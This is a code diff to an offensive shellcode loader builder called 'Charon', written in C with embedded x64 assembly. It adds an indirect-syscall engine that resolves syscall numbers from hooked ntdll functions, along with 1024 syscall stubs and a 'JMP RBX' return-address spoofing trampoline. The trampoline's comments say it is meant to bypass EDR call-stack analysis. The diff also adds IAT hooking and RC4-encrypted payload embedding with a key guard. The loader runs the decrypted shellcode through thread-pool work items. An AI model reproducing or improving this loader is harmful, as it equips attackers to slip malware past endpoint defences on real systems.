@@ -8,61 +8,70 @@
 // =================================================================================
 //  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL)
 // =================================================================================
-// This assembly block implements the "RBX Trampoline" technique.
-// It spoofs the return address on the stack to make it look like the syscall 
-// was triggered by a legitimate "JMP RBX" gadget inside kernel32.dll/ntdll.dll,
-// bypassing EDR Call Stack analysis.
 const char *g_HellHallAsm = 
-    "EXTERN wSystemCall:DWORD\n"
-    "EXTERN qSyscallInsAddress:QWORD\n"
+    "EXTERN qTableAddr:QWORD\n"
     "EXTERN qGadgetAddress:QWORD\n"
     "EXTERN qSavedRbx:QWORD\n"
     "EXTERN qSavedRetAddr:QWORD\n"
     ".code\n"
-    "    RunSyscall proc\n"
-    "        ; [1] PRESERVE CONTEXT\n"
-    "        ; RBX is a non-volatile register. The caller expects it unchanged.\n"
-    "        ; We save it globally because we need to use RBX for the trampoline.\n"
+    "    ; [SETUP] Sets the base address of the SyscallList (populated by C)\n"
+    "    PUBLIC SetTableAddr\n"
+    "    SetTableAddr PROC\n"
+    "        mov qTableAddr, rcx\n"
+    "        xor rax, rax\n"
+    "        inc rax\n"
+    "        ret\n"
+    "    SetTableAddr ENDP\n"
+    "\n"
+    "    ; [ENGINE] Central Executor\n"
+    "    ; Receives Syscall Index in EAX (passed by fXXXX stub)\n"
+    "    SyscallExec PROC\n"
+    "        ; [1] PRESERVE CONTEXT & LOOKUP\n"
+    "        mov r10, rcx       ; Save RCX in R10 (x64 Syscall Convention)\n"
+    "        \n"
+    "        ; Save RBX (Non-volatile, used for trampoline)\n"
     "        mov qSavedRbx, rbx\n"
+    "        \n"
+    "        ; Calculate Entry Address: TableBase + (Index * 32)\n"
+    "        ; SYSCALL_ENTRY size is 32 bytes (0x20)\n"
+    "        push rdx           ; Preserve RDX temporarily\n"
+    "        mov rdx, 20h       ; Size = 32\n"
+    "        mul rdx            ; RAX = Index * 32 (RAX has Index)\n"
+    "        mov rdx, qTableAddr\n"
+    "        add rdx, rax       ; RDX = Pointer to SYSCALL_ENTRY\n"
+    "        \n"
+    "        ; Load SSN and SyscallInst from Entry\n"
+    "        ; struct { pAddress(8), dwSsn(8), pSyscallRet(8), dwHash(8) }\n"
+    "        mov rax, [rdx + 08h] ; Load SSN into RAX\n"
+    "        mov r11, [rdx + 10h] ; Load 'syscall; ret' gadget into R11\n"
+    "        \n"
+    "        pop rdx            ; Restore RDX\n"
     "\n"
     "        ; [2] SAVE ORIGINAL RETURN ADDRESS\n"
-    "        ; We pop the real return address (back to our C main) from the stack.\n"
-    "        ; We must save it globally because the Syscall will overwrite RAX with NTSTATUS.\n"
-    "        pop rax\n"
-    "        mov qSavedRetAddr, rax\n"
+    "        pop rcx            ; Pop real return address\n"
+    "        mov qSavedRetAddr, rcx\n"
+    "        mov rcx, r10       ; Restore RCX (arg1)\n"
     "\n"
     "        ; [3] SPOOF THE STACK\n"
-    "        ; We push the address of a 'JMP RBX' gadget (found in a legit DLL).\n"
-    "        ; When the kernel function returns, it will pop this address and jump to it.\n"
-    "        push qGadgetAddress\n"
+    "        push qGadgetAddress ; Push 'JMP RBX' gadget addr\n"
     "\n"
     "        ; [4] PREPARE TRAMPOLINE\n"
-    "        ; The gadget does 'JMP RBX'. So we set RBX to point to our cleanup label.\n"
     "        lea rbx, BackFromKernel\n"
     "\n"
     "        ; [5] SETUP SYSCALL ARGUMENTS\n"
-    "        ; Windows x64 syscall convention requires RCX -> R10.\n"
-    "        mov r10, rcx\n"
+    "        mov r10, rcx       ; RCX is already in R10, but ensure it.\n"
     "\n"
     "        ; [6] EXECUTE INDIRECT SYSCALL\n"
-    "        ; Load the SSN into EAX.\n"
-    "        mov eax, wSystemCall\n"
-    "        ; Jump to a clean 'syscall; ret' instruction inside ntdll.dll.\n"
-    "        mov r11, qSyscallInsAddress\n"
-    "        jmp r11\n"
+    "        jmp r11            ; Jump to 'syscall; ret'\n"
     "\n"
     "    BackFromKernel:\n"
     "        ; [7] RESTORE CONTEXT\n"
-    "        ; The gadget jumped here via RBX.\n"
-    "        ; Restore the original RBX value.\n"
     "        mov rbx, qSavedRbx\n"
     "\n"
     "        ; [8] RETURN TO CALLER\n"
-    "        ; Retrieve the original return address we saved in step [2].\n"
     "        mov r11, qSavedRetAddr\n"
     "        jmp r11\n"
-    "    RunSyscall endp\n"
-    "end\n";
+    "    SyscallExec ENDP\n";
 
 // =================================================================================
 //  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
@@ -70,60 +79,65 @@ const char *g_HellHallAsm =
 const char *g_StubTemplate =
     "#include <windows.h>\n"
     "#include <stdio.h>\n"
+    "#include <string.h>\n"
     "\n"
     "// --- [SECTION 1] GLOBALS FOR ASM ---\n"
-    "// These variables are accessed via EXTERN in the assembly code.\n"
-    "DWORD wSystemCall = 0;\n"
-    "void* qSyscallInsAddress = NULL;\n"
+    "void* qTableAddr = NULL;\n"
     "void* qGadgetAddress = NULL;\n"
     "void* qSavedRbx = NULL;\n"
     "void* qSavedRetAddr = NULL;\n"
     "\n"
     "// --- [SECTION 2] INTERNAL STRUCTS ---\n"
+    "typedef struct _SYSCALL_ENTRY {\n"
+    "    PVOID pAddress;      // 0x00\n"
+    "    DWORD64 dwSsn;       // 0x08\n"
+    "    PVOID pSyscallRet;   // 0x10\n"
+    "    DWORD64 dwHash;      // 0x18\n"
+    "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
+    "\n"
+    "typedef struct _SYSCALL_LIST {\n"
+    "    DWORD Count;\n"
+    "    SYSCALL_ENTRY Entries[1024];\n"
+    "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
+    "\n"
     "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING, *PUSTRING;\n"
     "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
     "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
     "typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; union { BOOLEAN BitField; PVOID BitFieldPlace; }; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;\n"
     "\n"
+    "// --- GLOBALS ---\n"
+    "SYSCALL_LIST SyscallList;\n"
+    "extern void SetTableAddr(PVOID pTable);\n"
+    "extern void Fnc0000(); // Ref to base of stubs\n"
+    "\n"
     "// --- [SECTION 3] HELPERS ---\n"
-    "// Compile-time hash calculation helper\n"
-    "DWORD CRC32B(LPCSTR string) {\n"
-    "    DWORD mask = 0;\n"
-    "    DWORD state = 0xFFFFFFFF;\n"
-    "    unsigned int byte;\n"
-    "    while ((byte = *string++) != 0) {\n"
-    "        state = state ^ byte;\n"
-    "        for (int j = 0; j < 8; j++) {\n"
-    "            mask = -(int)(state & 1);\n"
-    "            state = (state >> 1) ^ (0xEDB88320 & mask);\n"
-    "        }\n"
-    "    }\n"
-    "    return ~state;\n"
+    "DWORD64 djb2(PBYTE str) {\n"
+    "    DWORD64 dwHash = 0x7734773477347734;\n"
+    "    INT c;\n"
+    "    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + c;\n"
+    "    return dwHash;\n"
     "}\n"
-    "#define HASH(x) CRC32B(x)\n"
     "\n"
-    "// Hunt for a clean 'syscall; ret' (0F 05 C3) instruction in ntdll.dll\n"
-    "PVOID FindSyscallStub() {\n"
-    "    PVOID pModule = (PVOID)GetModuleHandleA(\"ntdll.dll\");\n"
-    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
-    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + pDos->e_lfanew);\n"
-    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
-    "\n"
-    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
-    "        if (pSection[i].Characteristics & 0x20000020) { // Check for Executable section\n"
-    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + pSection[i].VirtualAddress);\n"
-    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
-    "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
-    "                if (pStart[z] == 0x0F && pStart[z+1] == 0x05 && pStart[z+2] == 0xC3) {\n"
-    "                    return (PVOID)(pStart + z);\n"
-    "                }\n"
-    "            }\n"
+    "PVOID GetNextSyscallInstruction(PVOID pAddress) {\n"
+    "    for (DWORD i = 0; i <= 32; i++) {\n"
+    "        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) == 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {\n"
+    "            return (PVOID)((ULONG_PTR)pAddress + i);\n"
     "        }\n"
     "    }\n"
     "    return NULL;\n"
     "}\n"
     "\n"
-    "// Hunt for a 'JMP RBX' (FF E3) gadget in the .text section of a module\n"
+    "DWORD64 GetSSN(PVOID pAddress) {\n"
+    "    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) return *((PBYTE)pAddress + 4);\n"
+    "    for (WORD idx = 1; idx <= 32; idx++) {\n"
+    "        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + idx * 32 + 3) == 0xb8)\n"
+    "            return *((PBYTE)pAddress + idx * 32 + 4) - idx;\n"
+    "        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - idx * 32 + 3) == 0xb8)\n"
+    "            return *((PBYTE)pAddress - idx * 32 + 4) + idx;\n"
+    "    }\n"
+    "    return -1;\n"
+    "}\n"
+    "\n"
     "PVOID FindGadgetInModule(const char* sModule) {\n"
     "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
     "    if (!pModule) return NULL;\n"
@@ -142,62 +156,114 @@ const char *g_StubTemplate =
     "    return NULL;\n"
     "}\n"
     "\n"
-    "// Resolve SSN using Tartarus Gate logic (Handles Hooked functions)\n"
-    "BOOL GetSSN(DWORD dwHash, DWORD* outSSN) {\n"
-    "    PVOID g_NtdllBase = (PVOID)GetModuleHandleA(\"ntdll.dll\");\n"
-    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllBase;\n"
-    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)g_NtdllBase + pDos->e_lfanew);\n"
-    "    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)g_NtdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
-    "    PDWORD pdwNames = (PDWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfNames);\n"
-    "    PDWORD pdwAddrs = (PDWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfFunctions);\n"
-    "    PWORD pwOrds = (PWORD)((ULONG_PTR)g_NtdllBase + pExport->AddressOfNameOrdinals);\n"
-    "\n"
-    "    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {\n"
-    "        char* szName = (char*)((ULONG_PTR)g_NtdllBase + pdwNames[i]);\n"
-    "        if (HASH(szName) == dwHash) {\n"
-    "            PVOID pFunc = (PVOID)((ULONG_PTR)g_NtdllBase + pdwAddrs[pwOrds[i]]);\n"
-    "            PBYTE pBytes = (PBYTE)pFunc;\n"
-    "            \n"
-    "            // 1. Check if function is clean (starts with: mov r10, rcx; mov eax, SSN)\n"
-    "            if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 && pBytes[3] == 0xB8) {\n"
-    "               *outSSN = ((pBytes[5] << 8) | pBytes[4]); \n"
-    "               return TRUE;\n"
-    "            }\n"
-    "            \n"
-    "            // 2. If hooked (starts with JMP/E9), use Tartarus Gate to check neighbors\n"
-    "            for (int z = 1; z < 32; z++) {\n"
-    "                if (pBytes[z*32] == 0x4C && pBytes[z*32+1] == 0x8B && pBytes[z*32+3] == 0xB8) {\n"
-    "                    *outSSN = ((pBytes[z*32+5] << 8) | pBytes[z*32+4]) - z; \n"
-    "                    return TRUE;\n"
-    "                }\n"
-    "                if (pBytes[z*-32] == 0x4C && pBytes[z*-32+1] == 0x8B && pBytes[z*-32+3] == 0xB8) {\n"
-    "                    *outSSN = ((pBytes[z*-32+5] << 8) | pBytes[z*-32+4]) + z; \n"
-    "                    return TRUE;\n"
-    "                }\n"
-    "            }\n"
-    "            return FALSE;\n"
-    "        }\n"
+    "// --- [SECTION 4] INIT ENGINE ---\n"
+    "BOOL InitApi() {\n"
+    "    PVOID ntdllBase = GetModuleHandleA(\"ntdll.dll\");\n"
+    "    if(!ntdllBase) return FALSE;\n"
+    "    \n"
+    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;\n"
+    "    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n"
+    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pDos->e_lfanew);\n"
+    "    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;\n"
+    "    \n"
+    "    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
+    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfFunctions);\n"
+    "    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfNames);\n"
+    "    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + pExport->AddressOfNameOrdinals);\n"
+    "    \n"
+    "    DWORD idx = 0;\n"
+    "    SetTableAddr(SyscallList.Entries);\n"
+    "    \n"
+    "    // 1. Find Stack Spoof Gadget\n"
+    "    qGadgetAddress = FindGadgetInModule(\"kernel32.dll\");\n"
+    "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(\"ntdll.dll\");\n"
+    "    if(!qGadgetAddress) { printf(\"[!] Gadget not found\\n\"); return FALSE; }\n"
+    "    \n"
+    "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
+    "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
+    "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
+    "        \n"
+    "        USHORT prefix = *(USHORT*)pcName;\n"
+    "        if (prefix != 0x744E && prefix != 0x775A) continue;\n"
+    "        \n"
+    "        DWORD64 dwSsn = GetSSN(pAddress);\n"
+    "        if (dwSsn == -1) continue;\n"
+    "        \n"
+    "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
+    "        if (!pSyscallRet) continue;\n"
+    "        \n"
+    "        SyscallList.Entries[idx].pAddress = pAddress;\n"
+    "        SyscallList.Entries[idx].dwSsn = dwSsn;\n"
+    "        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;\n"
+    "        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);\n"
+    "        \n"
+    "        idx++;\n"
+    "        if (idx >= 1024) break;\n"
     "    }\n"
-    "    return FALSE;\n"
+    "    SyscallList.Count = idx;\n"
+    "    return TRUE;\n"
     "}\n"
     "\n"
-    "// Linkage to Assembly\n"
-    "extern NTSTATUS RunSyscall();\n"
+    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
     "\n"
-    "// --- [SECTION 4] CONFIG & PAYLOAD ---\n"
+    "void InstallIATHooks() {\n"
+    "    PVOID pModule = GetModuleHandleA(NULL);\n"
+    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
+    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);\n"
+    "    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) return;\n"
+    "    \n"
+    "    // Helper for indirect syscall\n"
+    "    int idxProtect = -1;\n"
+    "    DWORD64 hProt = 0x858BCB1046FB6A37; // NtProtectVirtualMemory\n"
+    "    for(int i=0; i<SyscallList.Count; i++) {\n"
+    "        if(SyscallList.Entries[i].dwHash == hProt) { idxProtect = i; break; }\n"
+    "    }\n"
+    "    if(idxProtect == -1) return;\n"
+    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
+    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase + (idxProtect * 16));\n"
+    "\n"
+    "    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n"
+    "    while (pImport->Name) {\n"
+    "        char* szModName = (char*)((PBYTE)pModule + pImport->Name);\n"
+    "        if (_stricmp(szModName, \"ntdll.dll\") == 0) {\n"
+    "            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pModule + pImport->FirstThunk);\n"
+    "            PIMAGE_THUNK_DATA pOrgThunk = (PIMAGE_THUNK_DATA)((PBYTE)pModule + pImport->OriginalFirstThunk);\n"
+    "            if(!pOrgThunk) pOrgThunk = pThunk;\n"
+    "            \n"
+    "            while (pOrgThunk->u1.Function) {\n"
+    "                if (!(pOrgThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {\n"
+    "                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pModule + pOrgThunk->u1.AddressOfData);\n"
+    "                    DWORD64 dwHash = djb2((PBYTE)pImportName->Name);\n"
+    "                    for(DWORD i=0; i < SyscallList.Count; i++) {\n"
+    "                        if (SyscallList.Entries[i].dwHash == dwHash) {\n"
+    "                            PVOID pCtx = (PVOID)(&pThunk->u1.Function);\n"
+    "                            SIZE_T sSize = sizeof(PVOID);\n"
+    "                            DWORD oldProtect = 0;\n"
+    "                            if(fProt((HANDLE)-1, &pCtx, &sSize, PAGE_READWRITE, &oldProtect) == 0) {\n"
+    "                                PVOID pNewFunc = (PVOID)(pStubBase + (i * 16));\n"
+    "                                pThunk->u1.Function = (ULONG_PTR)pNewFunc;\n"
+    "                                fProt((HANDLE)-1, &pCtx, &sSize, oldProtect, &oldProtect);\n"
+    "                            }\n"
+    "                            break;\n"
+    "                        }\n"
+    "                    }\n"
+    "                }\n"
+    "                pThunk++;\n"
+    "                pOrgThunk++;\n"
+    "            }\n"
+    "        }\n"
+    "        pImport++;\n"
+    "    }\n"
+    "}\n"
+    "\n"
+    "// --- [SECTION 5] CONFIG & PAYLOAD ---\n"
     "#define KEY_SIZE 16\n"
     "#define HINT_BYTE {{HINT_BYTE}}\n"
-    "#define NtAllocateVirtualMemory_CRC32   0xE0762FEB\n"
-    "#define NtProtectVirtualMemory_CRC32    0x5C2D1A97\n"
-    "\n"
     "unsigned char Payload[] = { {{PAYLOAD_BYTES}} };\n"
     "unsigned char Key[] = { {{KEY_BYTES}} };\n"
     "\n"
     "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
-    "\n"
-    "// Function Prototypes for Stack Argument Safety\n"
     "typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
-    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
     "typedef NTSTATUS (NTAPI *fnTpAllocWork)(PVOID*, PVOID, PVOID, PVOID);\n"
     "typedef NTSTATUS (NTAPI *fnTpPostWork)(PVOID);\n"
     "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID, BOOLEAN);\n"
@@ -205,34 +271,29 @@ const char *g_StubTemplate =
     "\n"
     "int main() {\n"
     "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; HANDLE hProc = (HANDLE)-1;\n"
+    "    \n"
+    "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
+    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return -1; }\n"
+    "    printf(\"[+] Installing IAT Hooks...\\n\");\n"
+    "    InstallIATHooks();\n"
     "\n"
-    "    printf(\"[+] Initializing Charon Loader...\\n\");\n"
-    "\n"
-    "    // 1. Hunt for Stack Spoofing Gadget\n"
-    "    qGadgetAddress = FindGadgetInModule(\"kernel32.dll\");\n"
-    "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(\"ntdll.dll\");\n"
-    "    if(!qGadgetAddress) { printf(\"[!] Critical: 'JMP RBX' gadget not found.\\n\"); getchar(); return -1; }\n"
-    "\n"
-    "    // 2. Hunt for Indirect Syscall Stub\n"
-    "    qSyscallInsAddress = FindSyscallStub();\n"
-    "    if(!qSyscallInsAddress) { printf(\"[!] Critical: 'syscall; ret' stub not found.\\n\"); getchar(); return -1; }\n"
-    "\n"
-    "    printf(\"[+] Stack Spoofer Ready (Gadget: 0x%p | Stub: 0x%p)\\n\", qGadgetAddress, qSyscallInsAddress);\n"
-    "\n"
-    "    // 3. Resolve SSNs\n"
-    "    DWORD ssnAlloc = 0; DWORD ssnProtect = 0;\n"
-    "    if(!GetSSN(NtAllocateVirtualMemory_CRC32, &ssnAlloc)) { printf(\"[!] Failed to resolve NtAllocate SSN\\n\"); getchar(); return -2; }\n"
-    "    if(!GetSSN(NtProtectVirtualMemory_CRC32, &ssnProtect)) { printf(\"[!] Failed to resolve NtProtect SSN\\n\"); getchar(); return -3; }\n"
-    "\n"
-    "    // 4. Allocate Memory (Indirect Syscall + Stack Spoof)\n"
+    "    DWORD64 hAlloc = 0xF5BD373480A6B89B; // NtAllocateVirtualMemory\n"
+    "    int idxAlloc = -1, idxProtect = -1;\n"
+    "    for(int i=0; i<SyscallList.Count; i++) {\n"
+    "        if(SyscallList.Entries[i].dwHash == hAlloc) idxAlloc = i;\n"
+    "    }\n"
+    "    if (idxAlloc == -1) return -1;\n"
+    "    \n"
+    "    // Use STUB for Allocation (Indirect + Stack Spoof)\n"
+    "    PBYTE pStubBase = (PBYTE)&Fnc0000;\n"
+    "    fnNtAllocateVirtualMemory fAlloc = (fnNtAllocateVirtualMemory)(pStubBase + (idxAlloc * 16));\n"
+    "    \n"
     "    printf(\"[+] Allocating payload memory...\\n\");\n"
-    "    wSystemCall = ssnAlloc;\n"
-    "    NTSTATUS status = ((fnNtAllocateVirtualMemory)RunSyscall)(hProc, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
-    "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); getchar(); return -1; }\n"
+    "    NTSTATUS status = fAlloc(hProc, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
+    "    if(status != 0) { printf(\"[!] Allocation Failed: 0x%X\\n\", status); return -1; }\n"
     "\n"
-    "    // 5. Decrypt Payload (SystemFunction032 / RC4)\n"
     "    printf(\"[+] Decrypting payload...\\n\");\n"
-    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; // Brute-force key guard\n"
+    "    int b = 0; while(((Key[0]^b)-0) != HINT_BYTE) b++; \n"
     "    for(int i=0; i<KEY_SIZE; i++) Key[i] = (BYTE)((Key[i]^b)-i);\n"
     "    USTRING k = {KEY_SIZE, KEY_SIZE, Key}; USTRING d = {sSize, sSize, Payload};\n"
     "    fnSystemFunction032 Decrypt = (fnSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");\n"
@@ -240,13 +301,17 @@ const char *g_StubTemplate =
     "    d.Buffer = pAddr;\n"
     "    Decrypt(&d, &k);\n"
     "\n"
-    "    // 6. Protect Memory (RX)\n"
-    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
-    "    wSystemCall = ssnProtect;\n"
-    "    status = ((fnNtProtectVirtualMemory)RunSyscall)(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
-    "    if(status != 0) { printf(\"[!] NtProtect Failed: 0x%X\\n\", status); getchar(); return -1; }\n"
+    "    // Resolve Protect\n"
+    "    DWORD64 hProt = 0x858BCB1046FB6A37; \n"
+    "    for(int i=0; i<SyscallList.Count; i++) {\n"
+    "        if(SyscallList.Entries[i].dwHash == hProt) idxProtect = i;\n"
+    "    }\n"
+    "    fnNtProtectVirtualMemory fProt = (fnNtProtectVirtualMemory)(pStubBase + (idxProtect * 16));\n"
     "\n"
-    "    // 7. Execute via Thread Pool (Injection)\n"
+    "    printf(\"[+] Changing permissions to RX...\\n\");\n"
+    "    status = fProt(hProc, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);\n"
+    "    if(status != 0) { printf(\"[!] Protect Failed: 0x%X\\n\", status); return -1; }\n"
+    "\n"
     "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
     "    HMODULE hNt = GetModuleHandleA(\"ntdll.dll\");\n"
     "    fnTpAllocWork TpAlloc = (fnTpAllocWork)GetProcAddress(hNt, \"TpAllocWork\");\n"
@@ -265,8 +330,6 @@ const char *g_StubTemplate =
 // =================================================================================
 //  PART 3: BUILDER LOGIC
 // =================================================================================
-
-// Struct for local RC4 encryption
 typedef struct _USTRING_BUILDER {
   DWORD Length;
   DWORD MaximumLength;
@@ -274,7 +337,6 @@ typedef struct _USTRING_BUILDER {
 } USTRING;
 typedef NTSTATUS(NTAPI *fnSystemFunction032)(USTRING *Img, USTRING *Key);
 
-// Use Windows internal function for consistency
 void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data, DWORD dataSize) {
   HMODULE hAdvapi = LoadLibraryA("Advapi32.dll");
   if (!hAdvapi) return;
@@ -287,7 +349,6 @@ void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data, DWORD d
   FreeLibrary(hAdvapi);
 }
 
-// IO Helper: Read binary file
 unsigned char *ReadFileBytes(const char *filename, DWORD *outSize) {
   FILE *f = fopen(filename, "rb");
   if (!f) return NULL;
@@ -301,7 +362,6 @@ unsigned char *ReadFileBytes(const char *filename, DWORD *outSize) {
   return buffer;
 }
 
-// IO Helper: Convert bytes to C hex string
 char *BytesToHexString(unsigned char *data, DWORD size) {
   char *hexStr = (char *)malloc(size * 6 + 10);
   if (!hexStr) return NULL;
@@ -313,7 +373,6 @@ char *BytesToHexString(unsigned char *data, DWORD size) {
   return hexStr;
 }
 
-// String Helper: Replace pattern in template
 char *ReplacePattern(const char *original, const char *pattern, const char *replacement) {
   if (!original || !pattern || !replacement) return NULL;
   int newWlen = strlen(replacement);
@@ -324,6 +383,7 @@ char *ReplacePattern(const char *original, const char *pattern, const char *repl
 
   size_t newSize = strlen(original) + cnt * (newWlen - oldWlen) + 1;
   char *result = (char *)malloc(newSize);
+  struct _USTRING_BUILDER * u = NULL; // unused
   if (!result) return NULL;
 
   char *dest = result;
@@ -342,7 +402,6 @@ char *ReplacePattern(const char *original, const char *pattern, const char *repl
 }
 
 int main(int argc, char *argv[]) {
-
   printf("\n"
          "   _____ _    _          _____  ____  _   _ \n"
          "  / ____| |  | |   /\\   |  __ \\|  _ \\| \\ | |\n"
@@ -362,7 +421,6 @@ int main(int argc, char *argv[]) {
   const char *shellcodeFile = argv[1];
 
   // 1. Read Payload
-  printf("[*] Reading Shellcode: %s\n", shellcodeFile);
   DWORD shellcodeSize = 0;
   unsigned char *shellcode = ReadFileBytes(shellcodeFile, &shellcodeSize);
   if (!shellcode) { printf("[!] Failed to read file.\n"); return 1; }
@@ -373,31 +431,41 @@ int main(int argc, char *argv[]) {
   for (int i = 0; i < 16; i++) realKey[i] = rand() % 255;
   RC4_Encrypt(realKey, 16, shellcode, shellcodeSize);
 
-  // Apply KeyGuard (Brute-force protection)
   unsigned char b = (rand() % 200) + 1;
   for (int i = 0; i < 16; i++) protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
   unsigned char hintByte = protectedKey[0] ^ b;
-  printf("    -> Generated Secret: 0x%02X | Hint: 0x%02X\n", b, hintByte);
 
-  // Convert to strings
   char *sPayload = BytesToHexString(shellcode, shellcodeSize);
   char *sKey = BytesToHexString(protectedKey, 16);
   char sHint[10]; sprintf(sHint, "0x%02X", hintByte);
 
   // 3. Write ASM File
-  printf("[*] Dropping temporary assembly file (syscalls.asm)...\n");
+  printf("[*] Generazione syscalls.asm (HellHall + 1024 Stubs)...\n");
   FILE *fAsm = fopen("syscalls.asm", "w");
-  if (fAsm) { fputs(g_HellHallAsm, fAsm); fclose(fAsm); }
+  if (fAsm) { 
+      fputs(g_HellHallAsm, fAsm);
+      // Append 1024 Stubs
+      for (int i = 0; i < 1024; i++) {
+          fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
+          fprintf(fAsm, "    ALIGN 16\n"); 
+          fprintf(fAsm, "    Fnc%04X PROC\n", i);
+          fprintf(fAsm, "        mov eax, %d\n", i); // Pass Index to SyscallExec
+          fprintf(fAsm, "        jmp SyscallExec\n");
+          fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
+      }
+      fprintf(fAsm, "end\n");
+      fclose(fAsm); 
+  }
 
   // 4. Assemble
